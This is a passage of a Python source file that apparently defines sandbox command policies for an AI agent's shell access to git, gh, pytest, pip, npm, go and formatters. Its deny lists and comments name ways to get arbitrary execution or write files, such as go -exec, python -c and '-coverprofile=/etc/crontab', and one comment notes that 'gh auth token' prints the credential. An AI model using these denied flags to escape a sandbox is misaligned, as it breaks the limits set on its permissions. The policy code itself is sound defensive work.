        denied_flag_reasons=_NPM_DENIED_FLAG_REASONS,
    )


def _npm_manifest_write(reason: str) -> Subcommand:
    """An npm write that acts only on what the project already declares.

    Deliberately has neither actions nor value-taking flags: the sole thing
    separating ``npm install`` (this project's lockfile — confirmable) from
    ``npm install left-pad`` (fetch and run someone else's code — refused) is
    that the package name is read as an operand and refused there.
    """
    return Subcommand(
        confirm=True,
        confirm_reason=reason,
        strict_flags=True,
        allowed_flags=_NPM_ALLOWED_FLAGS,
        inline_value_flags=_NPM_INLINE_VALUE_FLAGS,
        denied_flags=_NPM_DENIED_FLAGS,
        denied_flag_reasons=_NPM_DENIED_FLAG_REASONS,
    )


def _npm_run() -> Subcommand:
    """``npm run <script>`` — free-form because the script name is data."""
    return Subcommand(
        free_form=True,
        confirm=True,
        confirm_reason="runs a script defined in this project's package.json — "
        "whatever that script says to do",
        strict_flags=True,
        allowed_flags=_NPM_ALLOWED_FLAGS,
        value_flags=_NPM_VALUE_FLAGS,
        denied_flags=_NPM_DENIED_FLAGS,
        denied_flag_reasons=_NPM_DENIED_FLAG_REASONS,
    )


#: Go's build flags that hand a step to a program named on the command line.
#: ``go test -exec ./anything`` is the whole shell in one flag.
_GO_DENIED_FLAGS = frozenset(
    {
        "-exec",
        "-toolexec",
        "-overlay",
        "-ldflags",
        "-gcflags",
        "-asmflags",
        "-pkgdir",
        "-modfile",
        "-o",
        # `go vet -vettool=./x` runs ./x. Listed explicitly even though
        # strict_flags already refuses the unknown, so the reason survives.
        "-vettool",
        "-gccgoflags",
        "-gccgo",
        "-compiler",
    }
)

_GO_DENIED_FLAG_REASONS = {
    "-exec": "it runs the compiled binary through a program you name, which "
    "is arbitrary command execution",
    "-toolexec": "it runs every compiler and linker invocation through a "
    "program you name, which is arbitrary command execution",
    "-overlay": "it replaces source files with ones listed in a JSON file, so "
    "what compiles is not what is in the checkout",
    "-ldflags": "it passes flags straight to the linker and the host C "
    "toolchain, which can load a compiler plugin",
    "-gcflags": "it passes flags straight to the compiler and the host C "
    "toolchain, which can load a compiler plugin",
    "-asmflags": "it passes flags straight to the assembler and the host C "
    "toolchain, which can load a compiler plugin",
    "-pkgdir": "it reads and writes compiled packages outside the checkout",
    "-modfile": "it builds against a module file chosen on the command line "
    "rather than the project's own go.mod",
    "-o": "it writes the built binary to a path chosen on the command line; "
    "this grant builds and tests, it does not place artefacts",
    "-vettool": "it runs the analysis tool you name instead of go's own, "
    "which is arbitrary command execution",
    "-gccgoflags": "it passes flags straight to gccgo and the host C "
    "toolchain, which can load a compiler plugin",
    "-gccgo": "it names the compiler binary to build with, which is arbitrary "
    "command execution",
    "-compiler": "it selects the compiler binary to build with, which is "
    "arbitrary command execution",
}

#: go flags that name a file to WRITE. Allowed, but only inside the checkout —
#: `-coverprofile=cover.out` is an ordinary CI line and
#: `-coverprofile=/etc/crontab` is a file-truncate primitive, and the only
#: thing separating them is the value.
_GO_PATH_VALUE_FLAGS = frozenset(
    {
        "-coverprofile",
        "-cpuprofile",
        "-memprofile",
        "-blockprofile",
        "-mutexprofile",
        "-outputdir",
    }
)

#: `go help build`, `go help test` and `go help vet`, audited flag by flag: the
#: ones that name neither a program, nor a toolchain, nor a path outside the
#: module. Anything absent is refused rather than passed through — see
#: Subcommand.strict_flags for why go gets the allowlist and git does not.
_GO_ALLOWED_FLAGS = frozenset(
    {
        "-v",
        "-x",
        "-n",
        "-a",
        "-work",
        "-race",
        "-msan",
        "-asan",
        "-cover",
        "-short",
        "-json",
        "-failfast",
        "-benchmem",
        "-trimpath",
        "-e",
        "-deps",
        "-u",
        "-m",
        "-versions",
        "-find",
        "-test",
        "-linkshared",
        "-fullpath",
        "-c",
        "-i",
        "-all",
        "-src",
    }
)

#: Value-taking go flags whose value is data — a count, a duration, a regexp, a
#: build-tag list — never a program and never a path outside the module.
_GO_VALUE_FLAGS = frozenset(
    {
        "-run",
        "-bench",
        "-benchtime",
        "-count",
        "-timeout",
        "-parallel",
        "-cpu",
        "-tags",
        "-mod",
        "-buildmode",
        "-buildvcs",
        "-shuffle",
        "-covermode",
        "-coverpkg",
        "-list",
        "-f",
        "-p",
        "-lang",
        "-fuzz",
        "-fuzztime",
        "-skip",
    }
)


def _go_run(
    *,
    denied_flags: frozenset[str] = frozenset(),
    denied_flag_reasons: Mapping[str, str] | None = None,
) -> Subcommand:
    """One go subcommand that compiles or inspects the packages in the checkout.

    ALLOW, on the same reasoning as ``pytest``: it builds and runs the
    project's own code. What it must not do is hand a step to a program named
    on the command line, which is what ``_GO_DENIED_FLAGS`` is for.
    """
    return Subcommand(
        free_form=True,
        strict_flags=True,
        allowed_flags=_GO_ALLOWED_FLAGS,
        value_flags=_GO_VALUE_FLAGS,
        path_value_flags=_GO_PATH_VALUE_FLAGS,
        denied_flags=_GO_DENIED_FLAGS | denied_flags,
        denied_flag_reasons={**_GO_DENIED_FLAG_REASONS, **(denied_flag_reasons or {})},
    )


def _formatter(
    binary: str,
    what: str,
    *,
    allowed_flags: frozenset[str],
    value_flags: frozenset[str],
    denied_flags: frozenset[str],
) -> BinaryPolicy:
    """A source formatter/linter — ALLOW, including when it rewrites files.

    It is strictly weaker than the ``python <script.py>`` grant next to it: a
    formatter edits files in the checkout to a fixed shape, where a script can
    do anything at all. Gating the weaker one while the stronger runs unasked
    would buy nothing and cost a prompt on every ``--fix``.

    What is still refused is the config flag: pointing the tool at settings
    outside the checkout changes what "formatted" means, and for ``ruff`` it
    also chooses which rules run.
    """
    return BinaryPolicy(
        binary=binary,
        summary=(
            f"{binary} — {what}. Checks and rewrites source files inside this "
            "checkout; refuses a config file or paths from outside it."
        ),
        install_hint=(
            f"Install {binary} with 'uv pip install -e \".[dev]\"' (or 'pip "
            f"install {binary}'). Verify with '{binary} --version'."
        ),
        positional=Subcommand(
            path_operands=True,
            allowed_flags=allowed_flags
            | frozenset({"-q", "--quiet", "-v", "--verbose"}),
            value_flags=value_flags,
            denied_flags=denied_flags,
            denied_flag_reasons={
                flag: (
                    "it takes settings or source from outside this checkout, "
                    "which changes what the tool actually does to the files"
                )
                for flag in denied_flags
            },
            denied_operand_prefixes={"-": _STDIN_OPERAND_REASON},
        ),
    )


BINARY_POLICIES: dict[str, BinaryPolicy] = {
    "gh": BinaryPolicy(
        binary="gh",
        confirm_summary="writes to GitHub",
        # Issue numbers and repo slugs, not paths — nothing for the shell
        # tool's path scan to check.
        remote_operands=True,
        summary=(
            "GitHub CLI — reads issues, pull requests, releases, and runs; "
            "comments, pull requests, and labels only with your per-command "
            "approval."
        ),
        install_hint=(
            "Install the GitHub CLI from https://cli.github.com (winget install "
            "GitHub.cli / brew install gh / apt install gh), then authenticate "
            "with 'gh auth login'. Verify with 'gh auth status'."
        ),
        subcommands={
            # `close`/`reopen` are deliberately absent: the triage skill's own
            # rule is "never close an issue on your own judgement", and closing
            # is the one issue write that silently ends someone else's thread.
            "issue": _gh({"list", "view", "status"}, {"create", "comment", "edit"}),
            # `create` and `comment`. `merge` lands code and `close` kills a
            # contribution — neither is triage, and both are irreversible in
            # ways a one-line prompt understates. `create` is neither: it
            # opens a proposal on a branch that already exists, and the
            # alternative is an agent that does the work and then cannot hand
            # it over.
            "pr": _gh(
                {"list", "view", "diff", "checks", "status"}, {"create", "comment"}
            ),
            "repo": _gh({"list", "view"}),
            "release": _gh({"list", "view"}),
            "run": _gh({"list", "view"}),
            # `delete` is absent: deleting a label strips it from every issue
            # that carries it, which no per-call prompt makes visible.
            "label": _gh({"list"}, {"create", "edit"}),
            "search": _gh({"issues", "prs", "repos", "code", "commits"}),
            # `status` only. `gh auth token` prints the credential.
            "auth": _gh({"status"}),
            "api": _GH_API,
        },
    ),
    # `pytest` is NOT a read-only grant in the sense `gh` is — it EXECUTES the
    # project's own test code. That is the same trust boundary as the
    # ungated `execute_python_file` tool (code already in the repo runs),
    # not a new one. What this policy restricts is the invocation shape: no
    # plugin injection, no interactive hang, no write outside the run, no
    # pointing pytest at config/paths outside the checkout. It does not, and
    # cannot, sandbox what the tests themselves do.
    #
    # Flags are an ALLOWLIST here (unlike `gh`'s denylist): a no-subcommand
    # binary parses the caller's arguments far more directly, so an
    # unreviewed flag is refused by default rather than passed through.
    #
    # Deliberately ABSENT — refused by simply not being in `allowed_flags` /
    # `value_flags` / `flag_values` / `flag_value_prefixes`:
    #   -s / --capture=no          not needed for a pass/fail run
    #   -l / --showlocals          can leak env vars/secrets into output
    #   --import-mode, --assert    change how test code is loaded/rewritten
    #   anything plugin-shaped that isn't `-p no:...` (see denied below)
    "pytest": BinaryPolicy(
        binary="pytest",
        summary=(
            "pytest — runs the project's own test suite. This EXECUTES "
            "project code (the same class as execute_python_file), not a "
            "read; the grant restricts flags and paths, never what a test "
            "itself does."
        ),
        install_hint=(
            "Install pytest with 'pip install pytest' (already a dev "
            "dependency: 'uv pip install -e \".[dev]\"'). Verify with "
            "'pytest --version'."
        ),
        positional=Subcommand(
            path_operands=True,
            allowed_flags=frozenset(
                {
                    "-q",
                    "--quiet",
                    "-v",
                    "--verbose",
                    "-x",
                    "--exitfirst",
                    "--collect-only",
                    "--co",
                    "--no-header",
                }
            ),
            # Any value is fine for these — -k/-m are pytest's own restricted
            # keyword/marker matchers (no eval, cannot call anything), and
            # --maxfail is just a count.
            value_flags=frozenset({"-k", "-m", "--maxfail"}),
            flag_values={
                "--tb": frozenset({"auto", "long", "short", "line", "native", "no"}),
            },
            # `-p <plugin>` auto-imports and runs that plugin's code at
            # collection time. Only a `no:`-prefixed *disable* is safe; `-p`
            # naming a plugin to enable is refused (falls through to the
            # denied-value error below, same message shape as gh's -X GET).
            flag_value_prefixes={"-p": frozenset({"no:"})},
            denied_flags=frozenset(
                {
                    # Interactive debuggers hang a non-interactive run forever
                    # (this process's stdin is DEVNULL — see shell_tools.py).
                    "--pdb",
                    "--trace",
                    # Report writers. `path_value_flags` could confine
                    # these to the checkout, as it does for go's profiles;
                    # they stay denied because a pass/fail run needs none of
                    # them, so the containment would be carrying no weight.
                    "--junitxml",
                    "--result-log",
                    "--basetemp",
                    # Point pytest at a config/rootdir outside the checkout,
                    # changing what actually RUNS — not merely where output
                    # lands, so containing the path would not make it safe.
                    "-c",
                    "--rootdir",
                    # Re-injects arbitrary CLI options (including `-p` with a
                    # real plugin, or any flag denied above) via an ini
                    # override — the one flag-level bypass of every other
                    # rule in this table, so it is denied on its own.
                    "-o",
                    "--override-ini",
                }
            ),
            denied_flag_reasons={
                "--pdb": "it drops into an interactive debugger and hangs a non-interactive run forever",
                "--trace": "it drops into an interactive debugger and hangs a non-interactive run forever",
                "--junitxml": "it writes a report file outside this grant's read-only run",
                "--result-log": "it writes a report file outside this grant's read-only run",
                "--basetemp": "it picks pytest's temp directory outside this grant's read-only run",
                "-c": "it can point pytest at a config file outside the project, changing what actually runs",
                "--rootdir": "it can point pytest at a config file outside the project, changing what actually runs",
                "-o": "it overrides pytest ini options (e.g. addopts), which can re-inject any flag this grant denies",
                "--override-ini": "it overrides pytest ini options (e.g. addopts), which can re-inject any flag this grant denies",
            },
        ),
    ),
    "git": BinaryPolicy(
        binary="git",
        confirm_summary="changes this repository",
        refuse_note=(
            "Anything that publishes to a remote, rewrites history, or "
            "destroys uncommitted work is refused outright and cannot be "
            "approved — say what you would have run and let the user run it."
        ),
        summary=(
            "git — reads history, branches, and the working tree; stages, "
            "commits, and switches branches only with your per-command "
            "approval. Never pushes, resets, rebases, or rewrites history."
        ),
        install_hint=(
            "Install git from https://git-scm.com/downloads (winget install "
            "Git.Git / brew install git / apt install git). Verify with "
            "'git --version'."
        ),
        # `--no-pager` earns its place beside --version: it makes the call
        # MORE contained, not less, by taking the configured pager (a program)
        # out of the run entirely.
        bare_flags=frozenset({"--version", "--help", "-h", "-P", "--no-pager"}),
        # The read-only floor this binary had before it had a policy — see
        # BinaryPolicy.ungranted. Unchanged from the shell tool's old
        # SAFE_GIT_COMMANDS, so an agent with no skill loaded behaves as before.
        ungranted=frozenset(
            {
                "status",
                "log",
                "show",
                "diff",
                "branch",
                "remote",
                "ls-files",
                "ls-tree",
                "describe",
                "rev-parse",
                "help",
            }
        ),
        subcommands={
            "status": _git_read(),
            "log": _git_read(),
            "show": _git_read(),
            "diff": _git_read(),
            "blame": _git_read(),
            "shortlog": _git_read(),
            "describe": _git_read(),
            "rev-parse": _git_read(),
            "merge-base": _git_read(),
            "ls-files": _git_read(),
            "ls-tree": _git_read(),
            "cat-file": _git_read(),
            "grep": _git_read(),
            # Flags only: `git branch` lists, and `git branch <name>`
            # CREATES a ref, which free-form would have called the same read.
            "branch": _git_read(
                no_operands=True,
                # Selectors whose operand FILTERS the listing rather than
                # naming a ref to create — consumed here so `no_operands`
                # never sees them.
                value_flags=frozenset(
                    {
                        "--list",
                        "--contains",
                        "--no-contains",
                        "--merged",
                        "--no-merged",
                        "--points-at",
                        "--sort",
                        "--format",
                    }
                ),
                denied_flags=_GIT_BRANCH_DENIED_FLAGS,
                denied_flag_reasons={
                    flag: "it deletes, renames, or repoints a branch. This "
                    "grant reads branches; it does not offer that write, and "
                    "-D in particular throws away commits that exist nowhere "
                    "else"
                    for flag in _GIT_BRANCH_DENIED_FLAGS
                },
            ),
            # `add`/`set-url`/`rename` point this repository at a different
            # server; nothing downstream would show that it had moved.
            "remote": _git_read(
                denied_actions=frozenset(
                    {
                        "add",
                        "remove",
                        "rm",
                        "rename",
                        "set-url",
                        "set-branches",
                        "set-head",
                        "prune",
                        "update",
                    }
                )
            ),
            "help": _git_read(
                denied_flags=frozenset({"-w", "--web"}),
                denied_flag_reasons={
                    "-w": "it opens a browser instead of returning the text, "
                    "so the answer never reaches you",
                    "--web": "it opens a browser instead of returning the "
                    "text, so the answer never reaches you",
                },
            ),
            "add": _git_write(
                "stages changes in this repository for the next commit",
                denied_flags=frozenset({"-i", "--interactive", "-p", "--patch"}),
                denied_flag_reasons={
                    flag: _INTERACTIVE_HANG
                    for flag in ("-i", "--interactive", "-p", "--patch")
                },
            ),
            "commit": _git_write(
                "records a commit in this repository",
                value_flags=frozenset(
                    {
                        "-m",
                        "--message",
                        "-c",
                        "--reedit-message",
                        "-C",
                        "--reuse-message",
                        "--author",
                        "--date",
                        "--fixup",
                        "--squash",
                        "--cleanup",
                    }
                ),
                denied_flags=frozenset(
                    {
                        "--amend",
                        "-F",
                        "--file",
                        "-e",
                        "--edit",
                        "-n",
                        "--no-verify",
                    }
                ),
                denied_flag_reasons={
                    "--amend": "it rewrites the previous commit rather than "
                    "adding one. If that commit is already pushed, every "
                    "checkout of it diverges — make a new commit instead",
                    "-F": "it takes the message from a local file, which the "
                    "approval prompt cannot show you. Pass the text with -m",
                    "--file": "it takes the message from a local file, which "
                    "the approval prompt cannot show you. Pass the text with -m",
                    "-e": _INTERACTIVE_HANG,
                    "--edit": _INTERACTIVE_HANG,
                    "-n": "it skips the repository's own commit hooks, which "
                    "are the checks the project asked for",
                    "--no-verify": "it skips the repository's own commit "
                    "hooks, which are the checks the project asked for",
                },
            ),
            "checkout": _git_write(
                "switches branches or overwrites files in the working tree — "
                "any uncommitted change to a file it touches is lost, and "
                "nothing recovers it",
                denied_flags=frozenset({"-f", "--force", "-B", "--orphan"}),
                denied_flag_reasons={
                    "-f": "it discards uncommitted changes without reporting "
                    "which ones. Commit or stash first, then switch",
                    "--force": "it discards uncommitted changes without "
                    "reporting which ones. Commit or stash first, then switch",
                    "-B": "it resets an existing branch to point somewhere "
                    "else, which loses the commits it pointed at",
                    "--orphan": "it starts a branch with no history, which is "
                    "a repository-shaped change no per-command prompt conveys",
                },
            ),
            "switch": _git_write(
                "switches branches in this repository",
                denied_flags=frozenset(
                    {"-f", "--force", "--discard-changes", "-C", "--orphan"}
                ),
                denied_flag_reasons={
                    "-f": "it discards uncommitted changes without reporting "
                    "which ones. Commit or stash first, then switch",
                    "--force": "it discards uncommitted changes without "
                    "reporting which ones. Commit or stash first, then switch",
                    "--discard-changes": "it throws away uncommitted work with "
                    "no undo. Commit or stash first",
                    "-C": "it resets an existing branch to point somewhere "
                    "else, which loses the commits it pointed at",
                    "--orphan": "it starts a branch with no history, which is "
                    "a repository-shaped change no per-command prompt conveys",
                },
            ),
            "restore": _git_write(
                "overwrites files from the index or a commit — uncommitted "
                "changes to those files are lost, and nothing recovers them"
            ),
            # `list`/`show` read; `drop`/`clear` destroy a stash entry, which
            # is the one copy of work that is in no commit, so they get no
            # rule at all.
            "stash": Subcommand(
                actions=frozenset({"list", "show"}),
                confirm_actions=frozenset({"push", "save", "apply", "pop"}),
                confirm_reason="moves uncommitted changes on or off the stash "
                "stack in this repository",
                denied_flags=_GIT_READ_DENIED_FLAGS,
                denied_flag_reasons=_GIT_READ_DENIED_FLAG_REASONS,
                value_flags=frozenset({"-m", "--message"}),
            ),
        },
    ),
    **{
        name: BinaryPolicy(
            binary=name,
            summary=(
                f"{name} — runs a Python program that is already in this "
                "checkout (the same trust boundary as execute_python_file). "
                "Code passed on the command line with -c is refused: it is "
                "unreviewed, and it would make every other command policy "
                "here decorative."
            ),
            install_hint=(
                f"'{name}' is not on PATH. Activate the project's virtual "
                'environment (uv venv && uv pip install -e ".[dev]"), then '
                f"verify with '{name} --version'."
            ),
            positional=Subcommand(
                path_operands=True,
                script_args=True,
                allowed_flags=frozenset({"-u", "-B", "-E", "-I", "-s", "-S", "-q"}),
                flag_values={
                    "-m": _PYTHON_MODULES,
                    # A warning filter's `category` field IMPORTS the module
                    # naming it, at interpreter startup. Only the bare actions
                    # are accepted, so -W cannot be an import primitive.
                    "-W": frozenset(
                        {"ignore", "default", "error", "always", "module", "once"}
                    ),
                },
                delegate_flag="-m",
                denied_operand_prefixes={"-": _STDIN_OPERAND_REASON},
                denied_flags=frozenset({"-c", "-i", "-X"}),
                denied_flag_reasons={
                    "-c": "it runs code passed on the command line. That code "
                    "is in no file anyone reviewed, and it can run any other "
                    "program — including the ones this table refuses. Write "
                    "the code to a file and run the file",
                    "-i": "it drops into an interactive prompt on a stdin that "
                    "is closed for an agent, so the command never returns",
                    "-X": "it toggles interpreter implementation options that "
                    "change how code is loaded, which this grant does not review",
                },
            ),
        )
        for name in ("python", "python3")
    },
    "pip": BinaryPolicy(
        binary="pip",
        confirm_summary="installs packages into this Python environment, "
        "running whatever setup code they ship",
        refuse_note=(
            "Installing from a URL or VCS address, repointing the index, and "
            "uninstalling are refused outright and cannot be approved."
        ),
        summary=(
            "pip — reads what is installed; installs from the project's own "
            "requirements or a named package only with your per-command "
            "approval. Never installs from a URL or a private index."
        ),
        install_hint=(
            "'pip' is not on PATH. Activate the project's virtual environment "
            "(uv venv), then verify with 'pip --version'."
        ),
        subcommands={
            "list": Subcommand(
                free_form=True,
                strict_flags=True,
                allowed_flags=_PIP_READ_FLAGS,
                value_flags=_PIP_READ_VALUE_FLAGS,
                denied_flags=_PIP_DENIED_FLAGS,
                denied_flag_reasons=_PIP_DENIED_FLAG_REASONS,
            ),
            "show": Subcommand(
                free_form=True,
                strict_flags=True,
                allowed_flags=_PIP_READ_FLAGS,
                value_flags=_PIP_READ_VALUE_FLAGS,
                denied_flags=_PIP_DENIED_FLAGS,
                denied_flag_reasons=_PIP_DENIED_FLAG_REASONS,
            ),
            "freeze": Subcommand(
                free_form=True,
                strict_flags=True,
                allowed_flags=_PIP_READ_FLAGS,
                value_flags=_PIP_READ_VALUE_FLAGS,
                denied_flags=_PIP_DENIED_FLAGS,
                denied_flag_reasons=_PIP_DENIED_FLAG_REASONS,
            ),
            "check": Subcommand(
                free_form=True,
                strict_flags=True,
                allowed_flags=_PIP_READ_FLAGS,
                value_flags=_PIP_READ_VALUE_FLAGS,
                denied_flags=_PIP_DENIED_FLAGS,
                denied_flag_reasons=_PIP_DENIED_FLAG_REASONS,
            ),
            "install": Subcommand(
                free_form=True,
                confirm=True,
                strict_flags=True,
                allowed_flags=_PIP_INSTALL_FLAGS,
                value_flags=_PIP_INSTALL_VALUE_FLAGS,
                denied_flags=_PIP_DENIED_FLAGS,
                denied_flag_reasons=_PIP_DENIED_FLAG_REASONS,
                denied_operand_prefixes={
                    **_REMOTE_OPERAND_PREFIXES,
                    "-": _STDIN_OPERAND_REASON,
                },
            ),
        },
    ),
    "uv": BinaryPolicy(
        binary="uv",
        confirm_summary="changes this project's Python environment",
        refuse_note=(
            "'uv run' and 'uv tool' execute a program chosen on the command "
            "line, and 'uv add' fetches a dependency from an address rather "
            "than the project's manifest; both are refused outright and "
            "cannot be approved."
        ),
        summary=(
            "uv — reads the dependency tree; syncs, locks, and installs from "
            "this project's own manifest only with your per-command approval."
        ),
        install_hint=(
            "Install uv from https://docs.astral.sh/uv/getting-started/ "
            "(winget install astral-sh.uv / brew install uv / pipx install "
            "uv). Verify with 'uv --version'."
        ),
        subcommands={
            # `uv version` is absent on purpose: since uv 0.7 it takes an
            # operand and REWRITES pyproject.toml. `uv --version` is the read,
            # and it is a bare flag.
            "tree": Subcommand(
                free_form=True,
                strict_flags=True,
                allowed_flags=_UV_ALLOWED_FLAGS,
                value_flags=_UV_VALUE_FLAGS,
                denied_flags=_PIP_DENIED_FLAGS,
                denied_flag_reasons=_PIP_DENIED_FLAG_REASONS,
            ),
            "pip": Subcommand(
                actions=frozenset({"list", "show", "freeze", "check", "tree"}),
                confirm_actions=frozenset({"install", "sync"}),
                confirm_reason="installs packages into this Python "
                "environment, running whatever setup code they ship",
                strict_flags=True,
                allowed_flags=_UV_ALLOWED_FLAGS | _PIP_INSTALL_FLAGS,
                value_flags=_PIP_INSTALL_VALUE_FLAGS | _UV_VALUE_FLAGS,
                denied_flags=_PIP_DENIED_FLAGS,
                denied_flag_reasons=_PIP_DENIED_FLAG_REASONS,
                denied_operand_prefixes=_REMOTE_OPERAND_PREFIXES,
            ),
            "sync": Subcommand(
                confirm=True,
                strict_flags=True,
                allowed_flags=_UV_ALLOWED_FLAGS,
                inline_value_flags=_UV_VALUE_FLAGS,
                confirm_reason="installs this project's locked dependencies "
                "into its environment",
                denied_flags=_PIP_DENIED_FLAGS,
                denied_flag_reasons=_PIP_DENIED_FLAG_REASONS,
            ),
            "lock": Subcommand(
                confirm=True,
                strict_flags=True,
                allowed_flags=_UV_ALLOWED_FLAGS,
                inline_value_flags=_UV_VALUE_FLAGS,
                confirm_reason="resolves and rewrites this project's lockfile",
                denied_flags=_PIP_DENIED_FLAGS,
                denied_flag_reasons=_PIP_DENIED_FLAG_REASONS,
            ),
            "venv": Subcommand(
                confirm=True,
                strict_flags=True,
                allowed_flags=_UV_ALLOWED_FLAGS,
                inline_value_flags=_UV_VALUE_FLAGS,
                confirm_reason="creates a virtual environment directory in "
                "this project",
            ),
        },
    ),
    "npm": BinaryPolicy(
        binary="npm",
        confirm_summary="runs this project's own package.json scripts or "
        "installs the dependencies it already declares",
        refuse_note=(
            "Anything that fetches and runs code chosen on the command line — "
            "'npm install <package>', 'npm exec', 'npm publish' — is refused "
            "outright and cannot be approved."
        ),
        summary=(
            "npm — reads the dependency tree; runs package.json scripts and "
            "installs from this project's lockfile only with your per-command "
            "approval. Never installs a package named on the command line."
        ),
        install_hint=(
            "Install Node.js (which ships npm) from https://nodejs.org "
            "(winget install OpenJS.NodeJS / brew install node / apt install "
            "nodejs npm). Verify with 'npm --version'."
        ),
        subcommands={
            "ls": _npm_read(),
            "list": _npm_read(),
            "view": _npm_read(),
            "outdated": _npm_read(),
            "why": _npm_read(),
            # No actions and no value-taking flags, by construction: the whole
            # difference between the lockfile install this offers and the
            # fetch-and-run it refuses is that a package name is read as an
            # operand. See Subcommand.__post_init__.
            "install": _npm_manifest_write(
                "installs the dependencies this project already declares"
            ),
            "i": _npm_manifest_write(
                "installs the dependencies this project already declares"
            ),
            "ci": _npm_manifest_write(
                "installs exactly this project's lockfile into node_modules, "
                "replacing what is there"
            ),
            "test": _npm_manifest_write(
                "runs this project's own test script from package.json"
            ),
            # `npm run <script>` executes whatever package.json says — the same
            # class of thing as `make`. It gets a rule where `make` does not
            # only because the script is named in the repository's own
            # manifest, so the user is approving a name they can look up,
            # rather than a target whose recipe is chosen at run time.
            "run": _npm_run(),
            "run-script": _npm_run(),
        },
    ),
    "go": BinaryPolicy(
        binary="go",
        single_dash_long=True,
        confirm_summary="rewrites this project's module files",
        refuse_note=(
            "'go run', 'go install' and 'go get' fetch or execute a package "
            "named on the command line, and 'go generate' runs whatever a "
            "source directive says; all are refused outright and cannot be "
            "approved."
        ),
        summary=(
            "go — builds, tests, and vets the packages in this checkout. "
            "Refuses the flags that hand compilation to another program "
            "(-exec, -toolexec, -ldflags) and the subcommands that fetch or "
            "run code named on the command line."
        ),
        install_hint=(
            "Install Go from https://go.dev/dl (winget install GoLang.Go / "
            "brew install go / apt install golang-go). Verify with "
            "'go version'."
        ),
        subcommands={
            "build": _go_run(),
            "test": _go_run(),
            "vet": _go_run(),
            "fmt": _go_run(),
            "list": _go_run(),
            "doc": _go_run(),
            "version": _go_run(),
            "env": _go_run(
                denied_flags=frozenset({"-w", "-u"}),
                denied_flag_reasons={
                    "-w": "it writes Go's persistent environment, which "
                    "changes how every later build behaves",
                    "-u": "it writes Go's persistent environment, which "
                    "changes how every later build behaves",
                },
            ),
            "mod": Subcommand(
                actions=frozenset({"download", "verify", "graph", "why"}),
                confirm_actions=frozenset({"tidy"}),
                confirm_reason="rewrites this project's go.mod and go.sum",
                strict_flags=True,
                allowed_flags=_GO_ALLOWED_FLAGS,
                value_flags=_GO_VALUE_FLAGS,
                denied_flags=_GO_DENIED_FLAGS,
                denied_flag_reasons=_GO_DENIED_FLAG_REASONS,
            ),
        },
    ),
    "black": _formatter(
        "black",
        "the Python formatter",
        allowed_flags=frozenset(
            {
                "--check",
                "--diff",
                "--fast",
                "--color",
                "--preview",
                "-S",
                "--skip-string-normalization",
            }
        ),
        value_flags=frozenset(
            {
                "-l",
                "--line-length",
                "-t",
                "--target-version",
                "--include",
                "--exclude",
                "--extend-exclude",
            }
        ),
        denied_flags=frozenset({"--config", "--code", "--stdin-filename"}),
    ),
    "isort": _formatter(
        "isort",
        "the Python import sorter",
        allowed_flags=frozenset({"--check", "--check-only", "-c", "--diff"}),
        value_flags=frozenset({"--profile", "-l", "--line-length"}),
        denied_flags=frozenset({"--sp", "--settings-path", "--settings-file"}),
    ),
    "ruff": _formatter(
        "ruff",
        "the Python linter and formatter",
        allowed_flags=frozenset(
            {
                "--check",
                "--diff",
                "--fix",
                "--no-cache",
                "--statistics",
                "--show-fixes",
                "--unsafe-fixes",
            }
        ),
        value_flags=frozenset(
            {
                "--select",
                "--ignore",
                "--extend-select",
                "--target-version",
                "--line-length",
                "--output-format",
                "--per-file-ignores",
            }
        ),
        denied_flags=frozenset({"--config", "--stdin-filename"}),
    ),
}


# ---------------------------------------------------------------------------
# Per-instance grant ledger
# ---------------------------------------------------------------------------


class BinaryGrants:
    """Which binaries this **one agent instance** may run, and for which skills.

    Keyed by binary so two skills declaring ``gh`` share one grant, and
    unloading one of them does not revoke the other's.
    """

    def __init__(self) -> None:
        self._holders: dict[str, set[str]] = {}

    def grant(self, binary: str, *, skill_name: str) -> None:
        """Grant *binary* for the lifetime of *skill_name*'s load."""
        self._holders.setdefault(binary, set()).add(skill_name)

    def revoke_skill(self, skill_name: str) -> list[str]:
        """Drop *skill_name*'s hold. Returns the binaries that lost their last one."""
        revoked = []
        for binary, holders in list(self._holders.items()):
            holders.discard(skill_name)
            if not holders:
                del self._holders[binary]
                revoked.append(binary)
        return sorted(revoked)

    def binaries(self) -> frozenset[str]:
        """Every currently granted binary."""
        return frozenset(self._holders)

    def __contains__(self, binary: object) -> bool:
        return binary in self._holders

    def __bool__(self) -> bool:
        return bool(self._holders)

    def __repr__(self) -> str:  # pragma: no cover - debug aid
        return f"BinaryGrants({sorted(self._holders)!r})"


# ---------------------------------------------------------------------------
# Load-time resolution
# ---------------------------------------------------------------------------


def binary_permissions(permissions: Sequence["Permission"]) -> list["Permission"]:
    """The ``shell:execute:<binary>`` entries of *permissions*."""
    return [p for p in permissions if p.is_binary_bridged]


def refuse_unpoliced_binaries(
    permissions: Sequence["Permission"], *, skill_name: str
) -> None:
    """Refuse a binary grant core has no command policy for.

    Called from :func:`gaia.skills.permissions.refuse_unbridged_permissions`, so
    every entry point — install, publish, migrate, ``register_skill_tools``,
    ``Agent.load_skill`` — gets the same gate.

    Raises:
        SkillPermissionError: the declared binary is not in :data:`BINARY_POLICIES`,
            so its subcommands cannot be gated.
    """
    for permission in binary_permissions(permissions):
        binary = (permission.scope or "").lower()
        if binary in BINARY_POLICIES:
            continue
        raise SkillPermissionError(
            f"Skill '{skill_name}' declares 'shell:execute:{binary}', but GAIA "
            f"ships no command policy for {binary!r}, so the grant "
            "cannot be enforced and the skill is refused rather than loaded "
            "unenforced. Declarable binaries: "
            f"{', '.join(sorted(BINARY_POLICIES)) or '(none)'}. To add one, "
            "contribute an entry to BINARY_POLICIES in "
            f"gaia/skills/binaries.py. See {FORMAT_DOCS_URL}#permission-model"
        )


def resolve_binary_policies(
    permissions: Sequence["Permission"],
    *,
    skill_name: str,
    require_installed: bool = True,
) -> list[BinaryPolicy]:
    """Resolve a skill's shell permissions to policies, failing loudly.

    Args:
        permissions: The skill's parsed permissions. Non-shell entries are ignored.
        skill_name: Named in every error.
        require_installed: Check ``PATH``. Off only for tests and static audits
            that inspect a skill without intending to run it.

    Raises:
        SkillPermissionError: the declared binary has no policy (so it cannot be
            gated), or is not installed (so the skill would load with a silent
            capability gap — the exact failure this bridge exists to prevent).
    """
    refuse_unpoliced_binaries(permissions, skill_name=skill_name)

    policies: list[BinaryPolicy] = []
    for permission in binary_permissions(permissions):
        policy = BINARY_POLICIES[(permission.scope or "").lower()]
        if require_installed and shutil.which(policy.binary) is None:
            raise SkillPermissionError(
